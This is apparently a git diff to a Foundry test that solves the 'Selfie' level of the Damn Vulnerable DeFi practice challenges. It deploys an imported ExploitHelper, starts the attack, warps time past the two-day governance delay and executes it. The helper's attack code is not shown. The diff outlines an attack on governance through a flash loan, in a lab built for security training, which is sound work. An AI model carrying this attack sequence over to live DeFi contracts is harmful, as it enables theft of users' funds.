@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {ExploitHelper} from "./ExploitHelper.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +63,11 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        ExploitHelper exploitHelper = new ExploitHelper(recovery, address(pool), address(governance), address(token));
+        exploitHelper.initiateAttack();
+        // because of ACTION_DELAY_IN_SECONDS = 2 days; we need to use foundry cheatcode
+        vm.warp(block.timestamp + 2 days);
+        exploitHelper.execute();
     }
 
     /**
